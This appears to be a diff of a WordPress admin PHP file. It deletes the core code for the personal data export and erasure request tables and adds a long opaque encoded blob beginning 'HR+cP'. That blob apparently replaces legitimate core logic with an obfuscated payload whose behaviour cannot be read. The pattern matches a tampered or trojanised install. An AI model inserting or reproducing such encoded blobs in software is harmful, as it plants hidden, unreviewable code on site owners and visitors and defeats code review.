-	_wp_privacy_completed_request( $request_id );
-
-	/**
-	 * Fires immediately after a personal data erasure request has been marked completed.
-	 *
-	 * @since 4.9.6
-	 *
-	 * @param int $request_id The privacy request post ID associated with this request.
-	 */
-	do_action( 'wp_privacy_personal_data_erased', $request_id );
-
-	return $response;
-}
-
-/**
- * Add requests pages.
- *
- * @since 4.9.6
- * @access private
- */
-function _wp_privacy_hook_requests_page() {
-	add_submenu_page( 'tools.php', __( 'Export Personal Data' ), __( 'Export Personal Data' ), 'export_others_personal_data', 'export_personal_data', '_wp_personal_data_export_page' );
-	add_submenu_page( 'tools.php', __( 'Erase Personal Data' ), __( 'Erase Personal Data' ), 'erase_others_personal_data', 'remove_personal_data', '_wp_personal_data_removal_page' );
-}
-
-// TODO: move the following classes in new files.
-if ( ! class_exists( 'WP_List_Table' ) ) {
-	require_once( ABSPATH . 'wp-admin/includes/class-wp-list-table.php' );
-}
-
-/**
- * WP_Privacy_Requests_Table class.
- *
- * @since 4.9.6
- */
-abstract class WP_Privacy_Requests_Table extends WP_List_Table {
-
-	/**
-	 * Action name for the requests this table will work with. Classes
-	 * which inherit from WP_Privacy_Requests_Table should define this.
-	 *
-	 * Example: 'export_personal_data'.
-	 *
-	 * @since 4.9.6
-	 *
-	 * @var string $request_type Name of action.
-	 */
-	protected $request_type = 'INVALID';
-
-	/**
-	 * Post type to be used.
-	 *
-	 * @since 4.9.6
-	 *
-	 * @var string $post_type The post type.
-	 */
-	protected $post_type = 'INVALID';
-
-	/**
-	 * Get columns to show in the list table.
-	 *
-	 * @since 4.9.6
-	 *
-	 * @return array Array of columns.
-	 */
-	public function get_columns() {
-		$columns = array(
-			'cb'                => '<input type="checkbox" />',
-			'email'             => __( 'Requester' ),
-			'status'            => __( 'Status' ),
-			'created_timestamp' => __( 'Requested' ),
-			'next_steps'        => __( 'Next Steps' ),
-		);
-		return $columns;
-	}
-
-	/**
-	 * Get a list of sortable columns.
-	 *
-	 * @since 4.9.6
-	 *
-	 * @return array Default sortable columns.
-	 */
-	protected function get_sortable_columns() {
-		return array();
-	}
-
-	/**
-	 * Default primary column.
-	 *
-	 * @since 4.9.6
-	 *
-	 * @return string Default primary column name.
-	 */
-	protected function get_default_primary_column_name() {
-		return 'email';
-	}
-
-	/**
-	 * Count number of requests for each status.
-	 *
-	 * @since 4.9.6
-	 *
-	 * @return object Number of posts for each status.
-	 */
-	protected function get_request_counts() {
-		global $wpdb;
-
-		$cache_key = $this->post_type . '-' . $this->request_type;
-		$counts    = wp_cache_get( $cache_key, 'counts' );
-
-		if ( false !== $counts ) {
-			return $counts;
-		}
-
-		$query = "
-			SELECT post_status, COUNT( * ) AS num_posts
-			FROM {$wpdb->posts}
-			WHERE post_type = %s
-			AND post_name = %s
-			GROUP BY post_status";
-
-		$results = (array) $wpdb->get_results( $wpdb->prepare( $query, $this->post_type, $this->request_type ), ARRAY_A );
-		$counts  = array_fill_keys( get_post_stati(), 0 );
-
-		foreach ( $results as $row ) {
-			$counts[ $row['post_status'] ] = $row['num_posts'];
-		}
-
-		$counts = (object) $counts;
-		wp_cache_set( $cache_key, $counts, 'counts' );
-
-		return $counts;
-	}
-
-	/**
-	 * Get an associative array ( id => link ) with the list of views available on this table.
-	 *
-	 * @since 4.9.6
-	 *
-	 * @return array Associative array of views in the format of $view_name => $view_markup.
-	 */
-	protected function get_views() {
-		$current_status = isset( $_REQUEST['filter-status'] ) ? sanitize_text_field( $_REQUEST['filter-status'] ) : '';
-		$statuses       = _wp_privacy_statuses();
-		$views          = array();
-		$admin_url      = admin_url( 'tools.php?page=' . $this->request_type );
-		$counts         = $this->get_request_counts();
-
-		$current_link_attributes = empty( $current_status ) ? ' class="current" aria-current="page"' : '';
-		$views['all']            = '<a href="' . esc_url( $admin_url ) . "\" $current_link_attributes>" . esc_html__( 'All' ) . ' (' . absint( array_sum( (array) $counts ) ) . ')</a>';
-
-		foreach ( $statuses as $status => $label ) {
-			$current_link_attributes = $status === $current_status ? ' class="current" aria-current="page"' : '';
-			$views[ $status ]        = '<a href="' . esc_url( add_query_arg( 'filter-status', $status, $admin_url ) ) . "\" $current_link_attributes>" . esc_html( $label ) . ' (' . absint( $counts->$status ) . ')</a>';
-		}
-
-		return $views;
-	}
-
-	/**
-	 * Get bulk actions.
-	 *
-	 * @since 4.9.6
-	 *
-	 * @return array List of bulk actions.
-	 */
-	protected function get_bulk_actions() {
-		return array(
-			'delete' => __( 'Remove' ),
-			'resend' => __( 'Resend email' ),
-		);
-	}
-
-	/**
-	 * Process bulk actions.
-	 *
-	 * @since 4.9.6
-	 */
-	public function process_bulk_action() {
-		$action      = $this->current_action();
-		$request_ids = isset( $_REQUEST['request_id'] ) ? wp_parse_id_list( wp_unslash( $_REQUEST['request_id'] ) ) : array(); // WPCS: input var ok, CSRF ok.
-		$count       = 0;
-
-		if ( $request_ids ) {
-			check_admin_referer( 'bulk-privacy_requests' );
-		}
-
-		switch ( $action ) {
-			case 'delete':
-				foreach ( $request_ids as $request_id ) {
-					if ( wp_delete_post( $request_id, true ) ) {
-						$count ++;
-					}
-				}
-
-				add_settings_error(
-					'bulk_action',
-					'bulk_action',
-					/* translators: %d: number of requests */
-					sprintf( _n( 'Deleted %d request', 'Deleted %d requests', $count ), $count ),
-					'updated'
-				);
-				break;
-			case 'resend':
-				foreach ( $request_ids as $request_id ) {
-					$resend = _wp_privacy_resend_request( $request_id );
-
-					if ( $resend && ! is_wp_error( $resend ) ) {
-						$count++;
-					}
-				}
-
-				add_settings_error(
-					'bulk_action',
-					'bulk_action',
-					/* translators: %d: number of requests */
-					sprintf( _n( 'Re-sent %d request', 'Re-sent %d requests', $count ), $count ),
-					'updated'
-				);
-				break;
-		}
-	}
-
-	/**
-	 * Prepare items to output.
-	 *
-	 * @since 4.9.6
-	 */
-	public function prepare_items() {
-		global $wpdb;
-
-		$primary               = $this->get_primary_column_name();
-		$this->_column_headers = array(
-			$this->get_columns(),
-			array(),
-			$this->get_sortable_columns(),
-			$primary,
-		);
-
-		$this->items    = array();
-		$posts_per_page = 20;
-		$args           = array(
-			'post_type'      => $this->post_type,
-			'post_name__in'  => array( $this->request_type ),
-			'posts_per_page' => $posts_per_page,
-			'offset'         => isset( $_REQUEST['paged'] ) ? max( 0, absint( $_REQUEST['paged'] ) - 1 ) * $posts_per_page : 0,
-			'post_status'    => 'any',
-			's'              => isset( $_REQUEST['s'] ) ? sanitize_text_field( $_REQUEST['s'] ) : '',
-		);
-
-		if ( ! empty( $_REQUEST['filter-status'] ) ) {
-			$filter_status       = isset( $_REQUEST['filter-status'] ) ? sanitize_text_field( $_REQUEST['filter-status'] ) : '';
-			$args['post_status'] = $filter_status;
-		}
-
-		$requests_query = new WP_Query( $args );
-		$requests       = $requests_query->posts;
-
-		foreach ( $requests as $request ) {
-			$this->items[] = wp_get_user_request_data( $request->ID );
-		}
-
-		$this->items = array_filter( $this->items );
-
-		$this->set_pagination_args(
-			array(
-				'total_items' => $requests_query->found_posts,
-				'per_page'    => $posts_per_page,
-			)
-		);
-	}
-
-	/**
-	 * Checkbox column.
-	 *
-	 * @since 4.9.6
-	 *
-	 * @param WP_User_Request $item Item being shown.
-	 * @return string Checkbox column markup.
-	 */
-	public function column_cb( $item ) {
-		return sprintf( '<input type="checkbox" name="request_id[]" value="%1$s" /><span class="spinner"></span>', esc_attr( $item->ID ) );
-	}
-
-	/**
-	 * Status column.
-	 *
-	 * @since 4.9.6
-	 *
-	 * @param WP_User_Request $item Item being shown.
-	 * @return string Status column markup.
-	 */
-	public function column_status( $item ) {
-		$status        = get_post_status( $item->ID );
-		$status_object = get_post_status_object( $status );
-
-		if ( ! $status_object || empty( $status_object->label ) ) {
-			return '-';
-		}
-
-		$timestamp = false;
-
-		switch ( $status ) {
-			case 'request-confirmed':
-				$timestamp = $item->confirmed_timestamp;
-				break;
-			case 'request-completed':
-				$timestamp = $item->completed_timestamp;
-				break;
-		}
-
-		echo '<span class="status-label status-' . esc_attr( $status ) . '">';
-		echo esc_html( $status_object->label );
-
-		if ( $timestamp ) {
-			echo ' (' . $this->get_timestamp_as_date( $timestamp ) . ')';
-		}
-
-		echo '</span>';
-	}
-
-	/**
-	 * Convert timestamp for display.
-	 *
-	 * @since 4.9.6
-	 *
-	 * @param int $timestamp Event timestamp.
-	 * @return string Human readable date.
-	 */
-	protected function get_timestamp_as_date( $timestamp ) {
-		if ( empty( $timestamp ) ) {
-			return '';
-		}
-
-		$time_diff = current_time( 'timestamp', true ) - $timestamp;
-
-		if ( $time_diff >= 0 && $time_diff < DAY_IN_SECONDS ) {
-			/* translators: human readable timestamp */
-			return sprintf( __( '%s ago' ), human_time_diff( $timestamp ) );
-		}
-
-		return date_i18n( get_option( 'date_format' ), $timestamp );
-	}
-
-	/**
-	 * Default column handler.
-	 *
-	 * @since 4.9.6
-	 *
-	 * @param WP_User_Request $item        Item being shown.
-	 * @param string          $column_name Name of column being shown.
-	 * @return string Default column output.
-	 */
-	public function column_default( $item, $column_name ) {
-		$cell_value = $item->$column_name;
-
-		if ( in_array( $column_name, array( 'created_timestamp' ), true ) ) {
-			return $this->get_timestamp_as_date( $cell_value );
-		}
-
-		return $cell_value;
-	}
-
-	/**
-	 * Actions column. Overridden by children.
-	 *
-	 * @since 4.9.6
-	 *
-	 * @param WP_User_Request $item Item being shown.
-	 * @return string Email column markup.
-	 */
-	public function column_email( $item ) {
-		return sprintf( '<a href="%1$s">%2$s</a> %3$s', esc_url( 'mailto:' . $item->email ), $item->email, $this->row_actions( array() ) );
-	}
-
-	/**
-	 * Next steps column. Overridden by children.
-	 *
-	 * @since 4.9.6
-	 *
-	 * @param WP_User_Request $item Item being shown.
-	 */
-	public function column_next_steps( $item ) {}
-
-	/**
-	 * Generates content for a single row of the table,
-	 *
-	 * @since 4.9.6
-	 *
-	 * @param WP_User_Request $item The current item.
-	 */
-	public function single_row( $item ) {
-		$status = $item->status;
-
-		echo '<tr id="request-' . esc_attr( $item->ID ) . '" class="status-' . esc_attr( $status ) . '">';
-		$this->single_row_columns( $item );
-		echo '</tr>';
-	}
-
-	/**
-	 * Embed scripts used to perform actions. Overridden by children.
-	 *
-	 * @since 4.9.6
-	 */
-	public function embed_scripts() {}
-}
-
-/**
- * WP_Privacy_Data_Export_Requests_Table class.
- *
- * @since 4.9.6
- */
-class WP_Privacy_Data_Export_Requests_Table extends WP_Privacy_Requests_Table {
-	/**
-	 * Action name for the requests this table will work with.
-	 *
-	 * @since 4.9.6
-	 *
-	 * @var string $request_type Name of action.
-	 */
-	protected $request_type = 'export_personal_data';
-
-	/**
-	 * Post type for the requests.
-	 *
-	 * @since 4.9.6
-	 *
-	 * @var string $post_type The post type.
-	 */
-	protected $post_type = 'user_request';
-
-	/**
-	 * Actions column.
-	 *
-	 * @since 4.9.6
-	 *
-	 * @param WP_User_Request $item Item being shown.
-	 * @return string Email column markup.
-	 */
-	public function column_email( $item ) {
-		/** This filter is documented in wp-admin/includes/ajax-actions.php */
-		$exporters       = apply_filters( 'wp_privacy_personal_data_exporters', array() );
-		$exporters_count = count( $exporters );
-		$request_id      = $item->ID;
-		$nonce           = wp_create_nonce( 'wp-privacy-export-personal-data-' . $request_id );
-
-		$download_data_markup = '<div class="export-personal-data" ' .
-			'data-exporters-count="' . esc_attr( $exporters_count ) . '" ' .
-			'data-request-id="' . esc_attr( $request_id ) . '" ' .
-			'data-nonce="' . esc_attr( $nonce ) .
-			'">';
-
-		$download_data_markup .= '<span class="export-personal-data-idle"><button type="button" class="button-link export-personal-data-handle">' . __( 'Download Personal Data' ) . '</button></span>' .
-			'<span style="display:none" class="export-personal-data-processing" >' . __( 'Downloading Data...' ) . '</span>' .
-			'<span style="display:none" class="export-personal-data-success"><button type="button" class="button-link export-personal-data-handle">' . __( 'Download Personal Data Again' ) . '</button></span>' .
-			'<span style="display:none" class="export-personal-data-failed">' . __( 'Download has failed.' ) . ' <button type="button" class="button-link">' . __( 'Retry' ) . '</button></span>';
-
-		$download_data_markup .= '</div>';
-
-		$row_actions = array(
-			'download-data' => $download_data_markup,
-		);
-
-		return sprintf( '<a href="%1$s">%2$s</a> %3$s', esc_url( 'mailto:' . $item->email ), $item->email, $this->row_actions( $row_actions ) );
-	}
-
-	/**
-	 * Displays the next steps column.
-	 *
-	 * @since 4.9.6
-	 *
-	 * @param WP_User_Request $item Item being shown.
-	 */
-	public function column_next_steps( $item ) {
-		$status = $item->status;
-
-		switch ( $status ) {
-			case 'request-pending':
-				esc_html_e( 'Waiting for confirmation' );
-				break;
-			case 'request-confirmed':
-				/** This filter is documented in wp-admin/includes/ajax-actions.php */
-				$exporters       = apply_filters( 'wp_privacy_personal_data_exporters', array() );
-				$exporters_count = count( $exporters );
-				$request_id      = $item->ID;
-				$nonce           = wp_create_nonce( 'wp-privacy-export-personal-data-' . $request_id );
-
-				echo '<div class="export-personal-data" ' .
-					'data-send-as-email="1" ' .
-					'data-exporters-count="' . esc_attr( $exporters_count ) . '" ' .
-					'data-request-id="' . esc_attr( $request_id ) . '" ' .
-					'data-nonce="' . esc_attr( $nonce ) .
-					'">';
-
-				?>
-				<span class="export-personal-data-idle"><button type="button" class="button export-personal-data-handle"><?php _e( 'Email Data' ); ?></button></span>
-				<span style="display:none" class="export-personal-data-processing button updating-message" ><?php _e( 'Sending Email...' ); ?></span>
-				<span style="display:none" class="export-personal-data-success success-message" ><?php _e( 'Email sent.' ); ?></span>
-				<span style="display:none" class="export-personal-data-failed"><?php _e( 'Email could not be sent.' ); ?> <button type="button" class="button export-personal-data-handle"><?php _e( 'Retry' ); ?></button></span>
-				<?php
-
-				echo '</div>';
-				break;
-			case 'request-failed':
-				submit_button( __( 'Retry' ), 'secondary', 'privacy_action_email_retry[' . $item->ID . ']', false );
-				break;
-			case 'request-completed':
-				echo '<a href="' . esc_url( wp_nonce_url( add_query_arg( array(
-					'action'     => 'delete',
-					'request_id' => array( $item->ID ),
-				), admin_url( 'tools.php?page=export_personal_data' ) ), 'bulk-privacy_requests' ) ) . '" class="button">' . esc_html__( 'Remove request' ) . '</a>';
-				break;
-		}
-	}
-}
-
-/**
- * WP_Privacy_Data_Removal_Requests_Table class.
- *
- * @since 4.9.6
- */
-class WP_Privacy_Data_Removal_Requests_Table extends WP_Privacy_Requests_Table {
-	/**
-	 * Action name for the requests this table will work with.
-	 *
-	 * @since 4.9.6
-	 *
-	 * @var string $request_type Name of action.
-	 */
-	protected $request_type = 'remove_personal_data';
-
-	/**
-	 * Post type for the requests.
-	 *
-	 * @since 4.9.6
-	 *
-	 * @var string $post_type The post type.
-	 */
-	protected $post_type = 'user_request';
-
-	/**
-	 * Actions column.
-	 *
-	 * @since 4.9.6
-	 *
-	 * @param WP_User_Request $item Item being shown.
-	 * @return string Email column markup.
-	 */
-	public function column_email( $item ) {
-		$row_actions = array();
-
-		// Allow the administrator to "force remove" the personal data even if confirmation has not yet been received.
-		$status = $item->status;
-		if ( 'request-confirmed' !== $status ) {
-			/** This filter is documented in wp-admin/includes/ajax-actions.php */
-			$erasers       = apply_filters( 'wp_privacy_personal_data_erasers', array() );
-			$erasers_count = count( $erasers );
-			$request_id    = $item->ID;
-			$nonce         = wp_create_nonce( 'wp-privacy-erase-personal-data-' . $request_id );
-
-			$remove_data_markup = '<div class="remove-personal-data force-remove-personal-data" ' .
-				'data-erasers-count="' . esc_attr( $erasers_count ) . '" ' .
-				'data-request-id="' . esc_attr( $request_id ) . '" ' .
-				'data-nonce="' . esc_attr( $nonce ) .
-				'">';
-
-			$remove_data_markup .= '<span class="remove-personal-data-idle"><button type="button" class="button-link remove-personal-data-handle">' . __( 'Force Erase Personal Data' ) . '</button></span>' .
-				'<span style="display:none" class="remove-personal-data-processing" >' . __( 'Erasing Data...' ) . '</span>' .
-				'<span style="display:none" class="remove-personal-data-failed">' . __( 'Force Erase has failed.' ) . ' <button type="button" class="button-link remove-personal-data-handle">' . __( 'Retry' ) . '</button></span>';
-
-			$remove_data_markup .= '</div>';
-
-			$row_actions = array(
-				'remove-data' => $remove_data_markup,
-			);
-		}
-
-		return sprintf( '<a href="%1$s">%2$s</a> %3$s', esc_url( 'mailto:' . $item->email ), $item->email, $this->row_actions( $row_actions ) );
-	}
-
-	/**
-	 * Next steps column.
-	 *
-	 * @since 4.9.6
-	 *
-	 * @param WP_User_Request $item Item being shown.
-	 */
-	public function column_next_steps( $item ) {
-		$status = $item->status;
-
-		switch ( $status ) {
-			case 'request-pending':
-				esc_html_e( 'Waiting for confirmation' );
-				break;
-			case 'request-confirmed':
-				/** This filter is documented in wp-admin/includes/ajax-actions.php */
-				$erasers       = apply_filters( 'wp_privacy_personal_data_erasers', array() );
-				$erasers_count = count( $erasers );
-				$request_id    = $item->ID;
-				$nonce         = wp_create_nonce( 'wp-privacy-erase-personal-data-' . $request_id );
-
-				echo '<div class="remove-personal-data" ' .
-					'data-force-erase="1" ' .
-					'data-erasers-count="' . esc_attr( $erasers_count ) . '" ' .
-					'data-request-id="' . esc_attr( $request_id ) . '" ' .
-					'data-nonce="' . esc_attr( $nonce ) .
-					'">';
-
-				?>
-				<span class="remove-personal-data-idle"><button type="button" class="button remove-personal-data-handle"><?php _e( 'Erase Personal Data' ); ?></button></span>
-				<span style="display:none" class="remove-personal-data-processing button updating-message" ><?php _e( 'Erasing Data...' ); ?></span>
-				<span style="display:none" class="remove-personal-data-failed"><?php _e( 'Erasing Data has failed.' ); ?> <button type="button" class="button remove-personal-data-handle"><?php _e( 'Retry' ); ?></button></span>
-				<?php
-
-				echo '</div>';
-
-				break;
-			case 'request-failed':
-				submit_button( __( 'Retry' ), 'secondary', 'privacy_action_email_retry[' . $item->ID . ']', false );
-				break;
-			case 'request-completed':
-				echo '<a href="' . esc_url( wp_nonce_url( add_query_arg( array(
-					'action'     => 'delete',
-					'request_id' => array( $item->ID ),
-				), admin_url( 'tools.php?page=remove_personal_data' ) ), 'bulk-privacy_requests' ) ) . '" class="button">' . esc_html__( 'Remove request' ) . '</a>';
-				break;
-		}
-	}
-
-}
+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
